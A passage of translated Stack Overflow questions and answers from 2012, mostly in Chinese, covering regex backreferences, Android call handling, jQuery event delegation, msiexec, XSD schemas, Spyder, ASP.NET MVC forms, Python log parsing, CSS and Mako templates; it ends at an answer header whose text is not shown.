> 
> 时间：2012-04-09T06:35:03.000

如果从正则表达式的末尾删除 /1，它适用于 m="img"：

```
m(\s*=\s*)((['\"]*)(.*)(['\"]*)) 
```

"\1" 被替换为模式中第一个子模式的值，所以如果你想匹配 m="img";m='img' 你应该使用以下内容：

```
(m\s*=\s*)((['\"]*)(.*)(['\"]*)\1) 
```

其中 m 是您的标签变量。

编辑：您可以[在此处](http://www.regular-expressions.info/javascriptexample.html)
测试您的 javascript 正则表达式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T06:32:51.050

*   如前所述，引号应该被转义。
*   反向引用也应该被转义。
*   一旦您使用反向引用，就不需要第二组带引号，
*   它是第三个括号组，其中包含引号，因此您需要 \3，而不是 \1
*   并且几乎不需要匹配任何数量的引号，例如：`m = '''img'''`

考虑到所有这些点，可能会得到以下解决方案：

```
var tag = 'm';
"m='img'".match(tag+"(\s*=\s*)((['\"]?)(.+?)\\3)")
// ["m='img'", "=", "'img'", "'", "img"] 
```

# android - 接到来电时如何调用活动。

> ID：10069667
> 
> 赞同：3
> 
> 时间：2012-04-09T06:19:45.187
> 
> 标签：android, android-intent, android-service, android-input-method

大家好，我想在默认的来电活动上调用我自己的活动。我已经使用广播接收器完成了这项工作，我在接到来电时调用了我的活动。但是从我第二次接到来电时它第一次工作正常，然后默认的来电活动正在通过我的活动。我不知道是什么问题，任何人都可以帮助我..

显现：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.satish.service"
android:versionCode="1"
android:versionName="1.0" >

<uses-sdk android:minSdkVersion="8" />

<uses-permission android:name="android.permission.MODIFY_PHONE_STATE" />
<uses-permission android:name="android.permission.CALL_PHONE" />
<uses-permission android:name="android.permission.READ_PHONE_STATE" />

<application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name" >
    <receiver
        android:name="MyCallReceiver"
        android:enabled="true" >
        <intent-filter android:priority="10">
            <action android:name="android.intent.action.PHONE_STATE" >

            </action>
        </intent-filter>
    </receiver>
    <receiver
        android:name="TestReceiver"
        android:enabled="true" >
        <intent-filter android:priority="10">
            <action android:name="jason.wei.custom.intent.action.TEST" >
            </action>
        </intent-filter>
    </receiver>

    <activity
        android:name="CallActivity"
        android:clearTaskOnLaunch="true"
        android:launchMode="singleTask" >
        <intent-filter android:priority="1000"></intent-filter>
    </activity>
</application>
</manifest> 
```

Java 代码：

```
public class MyCallReceiver extends BroadcastReceiver{
 public static final String CUSTOM_INTENT = "jason.wei.custom.intent.action.TEST";
Context context = null;
 private static final String TAG = "Phone call";

public void onReceive(Context context, Intent intent) {

    Bundle extras = intent.getExtras();
    if (extras != null) {
        String state = extras.getString(TelephonyManager.EXTRA_STATE);
        Log.w("DEBUG", state);
        if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {

                    Intent i = new Intent();
                    i.setAction(CUSTOM_INTENT);
                    context.sendBroadcast(i);

        }
    }
}
}

public class TestReceiver extends BroadcastReceiver {

public void onReceive(Context context, Intent intent) {
    if (intent.getAction().equals(MyCallReceiver.CUSTOM_INTENT)) {
        System.out.println("GOT THE INTENT");
        context.startActivity(new Intent(context, CallActivity.class)
                .setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
    }
}
}

public class CallActivity extends Activity implements OnClickListener{
private ITelephony telephonyService;
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    setTheme(android.R.style.Theme_Dialog);
    ((Button)findViewById(R.id.call)).setOnClickListener(this);
    ((Button)findViewById(R.id.end)).setOnClickListener(this);
    TelephonyManager telephony = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);  

      try {
           Class c = Class.forName(telephony.getClass().getName());
           Method m = c.getDeclaredMethod("getITelephony");
           m.setAccessible(true);
           telephonyService = (ITelephony) m.invoke(telephony);
          } catch (Exception e) {
           e.printStackTrace();
          }
}

@Override
public void onClick(View arg0) {
    switch (arg0.getId()) {
    case R.id.call:

        telephonyService.answerRingingCall();
        break;

    case R.id.end:
        telephonyService.endCall();
        finish();
        break;

    default:
        break;
    }
}
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-04T10:42:41.170

实际上完整的代码是我在上面发布的，只需替换下面的代码

```
public class TestReceiver extends BroadcastReceiver{

public void onReceive(Context context, Intent intent) {
if (intent.getAction().equals(MyCallReceiver.CUSTOM_INTENT)) {
    System.out.println("GOT THE INTENT");
    context.startActivity(new Intent(context, CallActivity.class)
            .setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
}
}
 } 
```

使用以下代码

```
 public class TestReceiver extends BroadcastReceiver{

@Override
public void onReceive(final Context context, Intent intent) {
    if (intent.getAction().equals(MyCallReceiver.CUSTOM_TEST_INTENT)) {
        System.out.println("GOT THE INTENT");
        final String mobileNumber = intent.getExtras().getString("number");
        Thread thread = new Thread(){
            private int sleepTime = 400;

            @Override
            public void run() {
                super.run();
                try {
                    int wait_Time = 0;

                    while (wait_Time < sleepTime ) {
                        sleep(100);
                        wait_Time += 100;
                    }
                }catch (Exception e) {
                    Toast.makeText(context,
                            "Error Occured Because:" + e.getMessage(),
                            Toast.LENGTH_SHORT).show();
                }
                finally {

                }

                context.startActivity(new Intent(context, CallActivity.class).putExtra("number", mobileNumber)
                        .setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
            }
        };
        thread.run();
    }
}
 } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T07:01:37.823

我创建了一个线程来调用我的活动，并且我在该开始活动之前写了一条语句，该语句睡眠时间为 500 毫秒。那是我的解决方案...如果有人不在 statd 下，那么问我我会在这里发布代码。

# jquery - 我的 .on() 表现得像 .bind()，而不是 .live()

> ID：10069674
> 
> 赞同：5
> 
> 时间：2012-04-09T06:20:24.880
> 
> 标签：jquery, ruby-on-rails, nested-forms

我有一个复杂的嵌套表单（Ryan Bates 的版本），`.live()`附加到一些动态生成的元素，我现在正在过渡到它`.on()`以及从 Jquery 1.4 到 1.7 的升级。

这是〜22个更改之一的示例：

```
# old version with .live()
$('.options .image').live('click', function(){
    console.log('clicked .options')
})

# new version with .on()
$('.options').on('click', '.image', function(){
    console.log('clicked .options')
}) 
```

这些更改对于已经存在的表单元素非常有效，但对于之后动态创建的任何嵌套元素它们都失败了。因此，它的工作方式更像 Jquery，`bind`而不是`live`. 你知道这里可能会发生什么吗？

由于代码的极度复杂性和大量部分，我现在将其排除在外（希望您可能有预感！）。谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T06:26:37.140

根据 3nigma 的评论，但使用您的原始选择器进行了修改，这将起作用：

```
$(document).on('click', '.options .image', function() {
  console.log('clicked .options');
}); 
```

但是，我不认为将文档设置为侦听器通常是要走的路。在您的原始版本中，`.live()`您正在选择`.image`节点内的`.options`节点。

但问题并没有说明哪些部分是动态加载的。我怀疑这`.options`也是动态加载的内容的一部分。用于委托侦听器时的第一个选择器`.on()`必须是未被破坏的东西：

```
$('#someWrapper').on('click', '.options .image', function() {
  console.log('clicked .options');
}); 
```

`#someWrapper`不需要是一个新的包装元素，它可以是任何祖先（有些人称之为“父母”......但这是用词不当，因为它可以是祖父母或曾祖父母或其他任何东西！）没有被破坏. 离目标选择器（.options .image）越近越好。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T06:26:55.150

要使您的`.on()`代码正常工作，该`.options`元素必须是静态的 - 而不是动态创建的。第一个选择器`.on()`必须是静态父级。它就像`.live()`你使用的那样工作：

```
$(document).on('click', '.options .image', fn); 
```

但是，如果您选择一个比对象更接近对象的静态父项（未创建或销毁的），您的页面将执行得更好`document`。由于您没有向我们展示您的 HTML，因此我无法推荐特定对象，但大概您可以挑选出正确的父对象。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T06:26:08.113

下面是和的正确`.on()` 语法`.live()`

```
$(selector).live(events, data, handler);                // jQuery 1.3+
$(document).delegate(selector, events, data, handler);  // jQuery 1.4.3+
$(document).on(events, selector, data, handler);        // jQuery 1.7+ 
```

看更多：

[`on v/s live`](http://www.jquery4u.com/jquery-functions/on-vs-live-review/)
[`on and off`](http://www.andismith.com/blog/2011/11/on-and-off/)

# windows-installer - How to use msiexec.exe to remove a Windows installer

> ID：10069677
> 
> 赞同：1
> 
> 时间：2012-04-09T06:20:30.193
> 
> 标签：windows-installer

We have a Windows installer package, `sample.msi`. To install the package we are using

```
msiexec /i sample.exec /qr 
```

To uninstall the same package, the below code is used.

```
msiexec /x sample.exec /qr 
```

When we use `/x` it deletes all the files in the associated directory which is created. We want to **retain all the contents** in the directory. How is that possible?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T07:00:47.157

默认情况下，Windows Installer 会删除软件包安装的所有文件，安装完成后创建的文件除外。如果要在卸载后保留已安装的文件，最简单的解决方案是将其组件标记为永久，在[组件表中](http://msdn.microsoft.com/en-us/library/windows/desktop/aa368007%28v=vs.85%29.aspx)。

# xml - What's wrong with my XSD XML Schema?

> ID：10069678
> 
> 赞同：2
> 
> 时间：2012-04-09T06:20:41.730
> 
> 标签：xml, xsd, root, complextype

I'd been 3 years since I messed with schemas and I remember them being very particular about name space prefixes and all. I also remember complex types not parsing so easily without unrolling when using the XML editor in Eclipse (I have Indigo).

So could one is you XML gurus look at my XML file and tell me what is wrong with the prepended XSD XML schema?

Thanks.

Ciao

+++++

Eclipse complains of:

The markup in the document following the root element must be well-formed.

I should point out I created the XML by hand and autogenerated the XML from it at:

[http://www.xmlforasp.net/codebank/system_xml_schema/buildschema/buildxmlschema.aspx](http://www.xmlforasp.net/codebank/system_xml_schema/buildschema/buildxmlschema.aspx)

(Seperate Complex Types: as I did manually 3 years ago with Amazon's Amazon Seller Central XML files manually)

If seems to me as ref should be used in one case but I'll defer to the experts.

+++++

```
<?xml version="1.0" encoding="utf-16"?>

<xsd:schema attributeFormDefault="unqualified" elementFormDefault="qualified" version="1.0" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <xsd:element name="idioms" type="idiomsType" />
    <xsd:complexType name="idiomsType">
        <xsd:sequence>
            <xsd:element maxOccurs="unbounded" name="idiom" type="idiomType" />
        </xsd:sequence>
    </xsd:complexType>
    <xsd:complexType name="idiomType">
        <xsd:sequence>
            <xsd:element name="phrase" type="xsd:string" />
            <xsd:element name="meaning" type="xsd:string" />
        </xsd:sequence>
    </xsd:complexType>
</xsd:schema>

<idioms>
    <idiom>
        <phrase>A bit much</phrase>
        <meaning>Excessive or annoying.</meaning>
    </idiom>
    <idiom>
        <phrase>A bridge too far</phrase>
        <meaning>Act of overreaching.</meaning>
    </idiom>
</idioms> 
```

OK, update. My shortcut of including XSD inline with XML is illegal. So I put it back in XSD file. I also learned that I can't start a prefix with xml so I changed it to 'tc'.

The XSD now is correct (in the same style as I unrolled Amazon Seller Central XSDs).

```
<?xml version="1.0" encoding="utf-16"?>

<xsd:schema xmlns:tcidioms="urn:tcidioms" targetNamespace="urn:tcidioms" version="1.0" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
     <xsd:element name="idioms" type="tcidioms:idiomsType"/>
     <xsd:complexType name="idiomsType">
         <xsd:sequence>
             <xsd:element maxOccurs="unbounded" name="idiom" type="tcidioms:idiomType" />
         </xsd:sequence>
     </xsd:complexType>
     <xsd:complexType name="idiomType">
         <xsd:sequence>
             <xsd:element name="phrase" type="xsd:string" />
             <xsd:element name="meaning" type="xsd:string" />
         </xsd:sequence>
     </xsd:complexType>
</xsd:schema> 
```

But I have trouble trying to include this im my XML file which now looks like this (the XML & XSD are in the same directory):

It complains: No grammar constraints (DTD or XML schema) detected for the document.

Meaning the 2 line in my XML document isn't correct. I've tried several variants to include this file but none have worked. Keep in mine this XML (and XSD) is going to be read off a local file systems rather than via http. Will it still validate in this manner?

```
<?xml version="1.0" encoding="utf-16"?>

<idioms xmlns:tcidioms="urn:tcidioms" targetNamespace="urn:tcidioms ./EnglishIdioms.xsd">
    <idiom>
        <phrase>A bit much</phrase>
       <meaning>Excessive or annoying.
       </meaning>
    </idiom>
    <idiom>
         <phrase>A bridge too far</phrase>
   <meaning>Act of overreaching, going too far
        and getting into trouble
        or
        failing.
   </meaning>
    </idiom>
</idioms> 
```

Visual Studio 2010 (it created the schema Russian Doll Style):

The XML file although set to use the schema in the VS2010 interface doesn't show that in the code?

```
<?xml version="1.0" encoding="utf-8"?>

<xs:schema attributeFormDefault="unqualified" elementFormDefault="qualified" xmlns:xs="http://www.w3.org/2001/XMLSchema">
    <xs:element name="idioms">
        <xs:complexType>
            <xs:sequence>
                <xs:element maxOccurs="unbounded" name="idiom">
                    <xs:complexType>
                        <xs:sequence>
                            <xs:element name="phrase" type="xs:string" />
                            <xs:element name="meaning" type="xs:string" />
                        </xs:sequence>
                    </xs:complexType>
                </xs:element>
            </xs:sequence>
        </xs:complexType>
    </xs:element>
</xs:schema>

<?xml version="1.0" encoding="utf-8"?>

<idioms>
    <idiom>
        <phrase>A bit much</phrase>
        <meaning>Excessive or annoying.</meaning>
    </idiom>
    <idiom>
        <phrase>A bridge too far</phrase>
        <meaning>Act of overreaching.</meaning>
    </idiom>
    <idiom>
        <phrase>A chain is no stronger than its weakest link</phrase>
        <meaning>The weakest part of an object is it's strength.</meaning>
    </idiom>
</idioms> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T06:38:49.987

您的根元素未正确关闭。

使用`</idioms>`，而不是`<idioms>`:)

**更新：**

缺少命名空间可能是问题（在模式和 xml 中）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T17:58:31.503

从[XSD 规范](http://www.w3.org/TR/xmlschema-1/)：

> 由顶级声明·已验证·元素信息项必须用该声明的{目标名称空间}进行限定（如果这是·不存在·，则该项必须是不限定的）。

翻译：

如果您想使用`elementFormDefault`设置为限定的属性（您是故意选择的吗？），那么您必须声明一个`targetNamespace`元素并将其设置为某个 URI，然后为其提供也在该命名空间中声明的 XML。所以，像

```
<xsd:schema targetNamespace="urn:so:example" attributeFormDefault="unqualified" elementFormDefault="qualified" version="1.0" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
...
</xsd:schema> 
```

并在 xml 中使用该命名空间：

```
<idioms xmlns="urn:so:example">
  <idiom>
    <phrase>A bit much</phrase>
    <meaning>Excessive or annoying.</meaning>
  </idiom>
  <idiom>
    <phrase>A bridge too far</phrase>
    <meaning>Act of overreaching.</meaning>
  </idiom>
</idioms> 
```

或者，我认为您可以`elementFormDefault`完全从方案标签中删除该属性。它的默认值是不合格的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T21:50:50.193

我使用 VS2010 从我的 XML 生成 XML 模式。在这样做时，它似乎忽略了（私有）命名空间，但它确实将 UI 中的模式设置为它刚刚生成的 XML 模式的名称。

此外，它不会在 XML 本身中显示它使用或包含此 XML 模式。

这是因为 XML 和 XSD 文件都具有相同的基本名称（EnglishIdioms.）并且这两个文件都在同一个目录中吗？

# python - Spyder plotting blocks console commands

> ID：10069680
> 
> 赞同：3
> 
> 时间：2012-04-09T06:20:49.997
> 
> 标签：python, matlab, matplotlib, ipython, spyder

Whenever I execute a `plt.show()` in an Ipython console in spyderlib, the console freezes until I close the figure window. This only occurs in spyderlib and the blocking does occur when I run `ipython --pylab` or run ipython normally and call `plt.ion()` before plotting. I've tried using `plt.draw()`, but nothing happens with that command.

`plt.ion()` works for ipython, but when I run the same command in spyder it seems to not plot anything altogether (`plt.show()` no longer works).

Enviroment Details: Python 2.6.5, Qt 4.6.2, PyQt4 (API v2) 4.7.2 on Linux

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-23T17:07:29.173

我遇到了类似的（我认为）问题。确保您的解释器设置为*在当前解释器中执行*（默认，应允许交互式绘图）。如果它设置为在新的专用 python 解释器中执行，请确保在选择*执行后与 python 解释器交互*。这为我解决了这个问题。

# actionscript-3 - 在 Flash 中分析视频的像素数据

> ID：10069686
> 
> 赞同：1
> 
> 时间：2012-04-09T06:21:28.447
> 
> 标签：actionscript-3, flash, video, ffmpeg

我正在使用 FFmpeg 在我的 PC 上进行一些视频分析，但我想看看我是否可以在使用 Flash 的浏览器中做类似的事情。

Flash 是否提供任何将视频文件作为输入、将其破解并访问像素数据的方法？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:20:24.283

一种方法是创建一个视频播放器（有默认组件）并将视频播放器绘制到 BitmapData 中。

```
var bitmapData:BitmapData = new BitmapData(videoWidth, heightHeight);
bitmapData.draw(videoPlayer);
trace(bitmapData.getPixel(123, 321)); 
```

这应该打印 123、321 处的像素。

# asp.net-mvc - 使用 htmlhelper 在 ASP.NET MVC 3 的 BeginForm() 方法中获取操作

> ID：10069687
> 
> 赞同：0
> 
> 时间：2012-04-09T06:21:30.040
> 
> 标签：asp.net-mvc, asp.net-mvc-3, razor, html-helper

在 ASP.NET MVC 3 中，我们总是使用`using(@html.BeginForm(){ }`帮助器（假设使用不带任何参数）来使用带有回发的表单。

返回的 html 包含一个`form`带有一些属性的打开标记，这些属性`action`代表回发 url。

所以当我覆盖我的自定义`BeginForm`助手时，我需要这个 Url。此`action`属性不仅仅是动作名称或`{area}/{controller}/{action}`.

我认为这是我们用来查看当前页面的相同 url，因为当我们提交页面时，我们支持相同的操作或具有`[HttpPost]`属性的相同操作名称。

那么我怎样才能得到这个值`HtmlHelper`呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T10:48:08.543

您可以使用 ILSpy 或任何其他反射器并查看 Html.BeginForm 中发生的情况

我只是为你复制粘贴代码。

```
// System.Web.Mvc.Html.FormExtensions
/// <summary>Writes an opening &lt;form&gt; tag to the response. When the user submits the form, the request will be processed by an action method.</summary>
/// <returns>An opening &lt;form&gt; tag. </returns>
/// <param name="htmlHelper">The HTML helper instance that this method extends.</param>
public static MvcForm BeginForm(this HtmlHelper htmlHelper)
{
    string rawUrl = htmlHelper.ViewContext.HttpContext.Request.RawUrl;
    return htmlHelper.FormHelper(rawUrl, FormMethod.Post, new RouteValueDictionary());
}

// System.Web.Mvc.Html.FormExtensions
private static MvcForm FormHelper(this HtmlHelper htmlHelper, string formAction, FormMethod method, IDictionary<string, object> htmlAttributes)
{
    TagBuilder tagBuilder = new TagBuilder("form");
    tagBuilder.MergeAttributes<string, object>(htmlAttributes);
    tagBuilder.MergeAttribute("action", formAction);
    tagBuilder.MergeAttribute("method", HtmlHelper.GetFormMethodString(method), true);
    bool flag = htmlHelper.ViewContext.ClientValidationEnabled && !htmlHelper.ViewContext.UnobtrusiveJavaScriptEnabled;
    if (flag)
    {
        tagBuilder.GenerateId(htmlHelper.ViewContext.FormIdGenerator());
    }
    htmlHelper.ViewContext.Writer.Write(tagBuilder.ToString(TagRenderMode.StartTag));
    MvcForm result = new MvcForm(htmlHelper.ViewContext);
    if (flag)
    {
        htmlHelper.ViewContext.FormContext.FormId = tagBuilder.Attributes["id"];
    }
    return result;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T11:18:42.137

如果您想要来自 @Html.BeginForm() 的操作属性而不需要任何参数，您可以使用 jquery。我用它来在 jqueryUI 对话框中 ajax 发布一个表单。

```
var form = $('form'); //get the form
var actionUrl = $('form').attr('action'); //get the action url 
```

然后你可以使用 POST

```
 $.ajax({
      type: "POST",
      url: actionUrl,
      data: form.serialize(),                                    
      success: function (data, status, xhr) {
                if (data.Sucess) {
                   //do something
               } else {
               }
      }
}) 
```

问候。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-04-09T07:02:48.560

使用 htmlhelper 参数

```
public class myBeginForm : IDisposable
{
    private HtmlHelper _myHtmlhelper;
    public myBeginForm (HtmlHelper htmlHelper, [you can add your need argument here] )
    {
        _myHtmlhelper= htmlHelper;
        var container = new TagBuilder("form");

       /// your Code 
    }

    public void Dispose()
    {
        myHtmlhelper.ViewContext.Writer.Write("</form>");
    }
} 
```

# python - 解析文本日志文件以从日志消息中提取某些数据字段

> ID：10069689
> 
> 赞同：2
> 
> 时间：2012-04-09T06:21:35.577
> 
> 标签：python, whitespace, formatting

我是 python 新手并且坚持如何做到这一点。我有一个大约 4GB 的非常大的文本文件，其中包含错误消息。文本文件中的每个消息行代表一条消息，我需要过滤掉几列并将空格字符替换为 |。例子：

```
input:
83b14af0-949b-71e0-18d5-0ad781020000 40ba8352-8dd2-71dc-12b8-0ad781020000 1 -1407714483 20 COLG-GRA-617-RD1.oss 1 181895426 12 oss-ap-1.oss 0 0 48 0 0 0 1307845644 1307845647 0 2 12 0 0 0  0 0 12 0 0 0  0 0 1307845918 3 OpC 6 opcecm 9 SNMPTraps 8 IBB_COLG 4 ATM0 0  0  0  69 Cisco Agent Interface Up (linkUp Trap) on interface ATM0 --Sev Normal 372 Generic: 3; Specific: 0; Enterprise: .1.3.6.1.4.1.9.1.569;
output:
83b14af0-949b-71e0-18d5-0ad781020000 | 40ba8352-8dd2-71dc-12b8-0ad781020000 | COLG-GRA-617-RD1.oss | 1307845644 | 1307845647 |1307845918 | Cisco Agent Interface Up (linkUp Trap) on interface ATM0 | Normal 372 | Generic: 3 | Specific: 0 | Enterprise: .1.3.6.1.4.1.9.1.569 
```

我真的很感激任何帮助

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T07:54:04.423

您的输入文件格式很烦人。我们可以在空白处拆分输入，但是您要捕获的某些字段应该包含空白。我们可以将输入拆分为列号，但我不确定每个字符串的长度是否始终相同；这些数字的位数似乎可能会有所不同。所以最好的解决方案应该涉及正则表达式。

用一个正则表达式来解析整行，写起来和理解起来都会很麻木。但是我们可以从较短的模式构建模式。我认为结果很容易理解。此外，如果文件格式发生变化或您要捕获的字段发生变化，我认为您可以很容易地更改它。

请注意，我们使用 Python 的“字符串重复”运算符`*`来重复较短的模式。如果我们想要识别和捕获 2 个单词，我们可以使用`c*2`重复捕获模式两次。

在您所需输出的示例中，您有一些额外的空白。我编写的模式不捕获任何空白，但如果您真的想要空白，您可以根据需要编辑模式。

如果您不了解正则表达式，您应该阅读 Python`re`模块的文档。简而言之，括号中的模式部分将被捕获，其他部分将匹配但不被捕获。 `\s`匹配空白，并`\S`匹配非空白。 `+`在一个模式中表示“1 或更多”并且`*`表示“0 或更多”。 `^`并`$`分别匹配模式的开头和结尾。

```
import re

# Define patterns we want to recognize.

c = r'(\S+)\s+'  # a word we want to capture
s = r'\S+\s+'  # a word we want to skip
mesg = r'(\S.*\S)\s+--Sev\s+'  # mesg to capture; terminated by string '--Sev'
w2 = r'(\S+\s+\S+)\s+'  # two words separated by some white space
w2semi = r'(\S+\s+\S+)\s*;\s+'  # two words terminated by a semicolon
tail = r'(.*\S)\s*;'

# Join together the above patterns to make one giant pattern that parses
# the input.
s_pat = ( r'^\s*' + 
    c*2 + s*3 + c*1 + s*10 + c*2 + s*14 + c*1 + s*14 +
    mesg + w2 + w2semi*2 + tail +
    r'\s*$')

# Pre-compile the pattern for speed.
pat = re.compile(s_pat)

# Test string and the expected output result.
s_input = "83b14af0-949b-71e0-18d5-0ad781020000 40ba8352-8dd2-71dc-12b8-0ad781020000 1 -1407714483 20 COLG-GRA-617-RD1.oss 1 181895426 12 oss-ap-1.oss 0 0 48 0 0 0 1307845644 1307845647 0 2 12 0 0 0  0 0 12 0 0 0  0 0 1307845918 3 OpC 6 opcecm 9 SNMPTraps 8 IBB_COLG 4 ATM0 0  0  0  69 Cisco Agent Interface Up (linkUp Trap) on interface ATM0 --Sev Normal 372 Generic: 3; Specific: 0; Enterprise: .1.3.6.1.4.1.9.1.569;"
s_correct = "83b14af0-949b-71e0-18d5-0ad781020000|40ba8352-8dd2-71dc-12b8-0ad781020000|COLG-GRA-617-RD1.oss|1307845644|1307845647|1307845918|Cisco Agent Interface Up (linkUp Trap) on interface ATM0|Normal 372|Generic: 3|Specific: 0|Enterprise: .1.3.6.1.4.1.9.1.569"

# re.match() returns a "match group"
m = re.match(pat, s_input)
# m.groups() returns sequence of captured strings; join with '|'
s_output = '|'.join(m.groups())

# sanity check
if s_correct == s_output:
    print "excellent"
else:
    print "bogus"

# excellent. 
```

通过编写、测试和调试模式，编写程序来实际处理文件非常简单。

```
# use the pattern defined above, named "pat"
with open(input_file, "r") as f_in, open(output_file, "w") as f_out:
    for line_num, line in enumerate(f_in, 1):
        try:
            m = re.match(pat, line)
            s_output = '|'.join(m.groups())
            f_out.write(s_output + '\n')
        except Exception:
            print("unable to parse line %d: %s" % (line_num, line) 
```

这将一次读取文件一行，处理该行，并将处理后的行写入输出文件。

请注意，我`with`在一行上使用了多个语句。这适用于任何最近的 Python，但不适用于 2.5 或 3.0。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T06:41:29.140

`replace()`对您读入的行使用字符串的内置方法。有关字符串方法的列表，请参见[http://docs.python.org/library/stdtypes.html#string-methods 。](http://docs.python.org/library/stdtypes.html#string-methods)

```
new_string = my_string.replace(' ', ' | ') 
```

如果您还需要删除“列”，那么您将有更多的运气先拆分字符串，使用“[切片](http://docs.python.org/tutorial/introduction.html#strings)”消除列，然后加入拆分器上的列表。

```
cols = my_string.split(' ')
cols = cols[:2] + cols[4:8] + cols[11:]  #Just making up some arbitrary removed columns
new_string = ' | '.join(cols) 
```

请注意，这假定您的输入将始终以空格分隔，并且您的数据不包含空格。如果您的输入数据更复杂，拆分代码会变得更有趣。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T08:26:42.760

如果您使用的是 linux，使用 sed 命令很容易替换字符。它会比在 python 中逐行读取要快，因为你的文件太大了。

```
sed -i 's/pattern/|/g' inputfile 
```

上面的命令将用 | 替换所有模式字符串。

# android - 无法阻止特定号码的拨出电话

> ID：10069692
> 
> 赞同：0
> 
> 时间：2012-04-09T06:21:50.030
> 
> 标签：android, phone-call, telephony

我想在我的应用程序中阻止拨出呼叫我正在使用以下编码来阻止呼叫

```
public class MyReceiver extends BroadcastReceiver{

     Context context = null;
     private ITelephony telephonyService;
     String number;
     TelephonyManager telephony;
     String ussd = "*123456";
    @Override
  public void onReceive(Context context, Intent intent) 
  {
     if( intent.getAction().equals( Intent.ACTION_NEW_OUTGOING_CALL ) ) 
     { 
        number = intent.getExtras().getString( Intent.EXTRA_PHONE_NUMBER ); 
        Log.i( "out1", "number: " + number );           
     }
     telephony = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
    try 
    {
         String action = intent.getAction();
         if(number.equals(ussd))
         {
              Class c = Class.forName(telephony.getClass().getName());
              Method m = c.getDeclaredMethod("getITelephony"); 
              m.setAccessible(true);
             com.android.internal.telephony.ITelephony telephonyService  = (ITelephony) m.invoke(telephony);
             telephonyService.silenceRinger();
             telephonyService.endCall();
        }
    } 
    catch (Exception e) 
    {
        e.printStackTrace();
    }

}
} 
```

当有人拨打特定的任何号码时，我想阻止呼叫，即我给了***12345**。如果我删除此源代码工作正常`if(number.equals(ussd)) then i am able to block all outgoing calls but i am trying for particular number please help me to find where am i wrong ?`

# css - 如何在锚标签抛出css后放置背景？

> ID：10069700
> 
> 赞同：1
> 
> 时间：2012-04-09T06:22:46.780
> 
> 标签：css

如果是，请告诉我，在不更改 HTML 的情况下可以在 css 中使用。

我想说如何在带有 css 的锚标记之后放置背景图像

**像这样**

![在此处输入图像描述](../Images/e48d0dfc61d2da871e48f9e32a56d0cf.png)

**我的代码是**

```
<div class="right-f">
                <span>Connect with us:</span>
                <a href="#" rel="twit"></a>
                <a href="#" rel="fb"></a>
                <a href="#" rel="in"></a>
                <a href="#" rel="mail"></a>
            </div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T06:28:48.287

使用[属性选择器](http://www.w3.org/TR/CSS2/selector.html#attribute-selectors)：

```
.right-f a[rel="twit"] {
    background-image: ...
}
.right-f a[rel="fb"] {
    background-image: ...
}
.right-f a[rel="etc"] { 
```

# android - 文件获取方法

> ID：10069702
> 
> 赞同：0
> 
> 时间：2012-04-09T06:23:01.910
> 
> 标签：android, android-file

我正在尝试从 Android 中的特定文件夹中读取文件，我有两种方法可以做到这一点：

1）使用典型做法如下

```
 File mainLoc = Environment.getExternalStorageDirectory();
   File folderLoc = new File(mainLoc , "/foldername/"); 
```

然后使用文件名过滤器获取它。

2）另一种方法是使用 BroadcastReceiver

```
 IntentFilter filter = new IntentFilter();
   filter.addAction(Intent.ACTION_MEDIA_MOUNTED);
   filter.addAction(Intent.ACTION_MEDIA_REMOVED); 
```

所以我真的不知道这些方法之间有什么区别，哪种方法有效且代表最佳实践？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T06:33:59.603

据我了解，这些意图仅在安装或卸载外部媒体时触发。因此，除非触发了这些意图，否则您不能使用该方法。

# pyramid - 未定义的 mako 模板错误

> ID：10069704
> 
> 赞同：0
> 
> 时间：2012-04-09T06:23:05.920
> 
> 标签：pyramid, mako

我正在使用带有 Mako 模板的 Pyramid 1.3。我有一个名为“create”的方法的视图，该方法将空字典返回到模板。我打算使用相同的“create.mako”模板进行创建和编辑。我已经在我的输入字段中放置了这样的上下文变量：

```
<input type="text" id="nameInput" value="${content['name']}" /> 
```

问题是当我尝试加载 create 方法时出现如下错误：

```
<input id="nameInput" value="${content['name']}" type="text" class="span8" style="background-color: #EED3D7;" />
TypeError: 'Undefined' object is unsubscriptable 
```

这当然是正确的，因为 create 方法只返回一个空字典，因此没有键“content”。这在 Pylons 0.9.7 中曾经很好；如果它不存在，它将只是一个空字符串。

我从 StackOverflow 找到了一个解决方案：

```
import mako.runtime
mako.runtime.UNDEFINED = '' 
```

但是我应该把它放在我的 Pyramid 项目中的什么地方呢？

* * *

## 回答 #1

> 赞同：2
> 
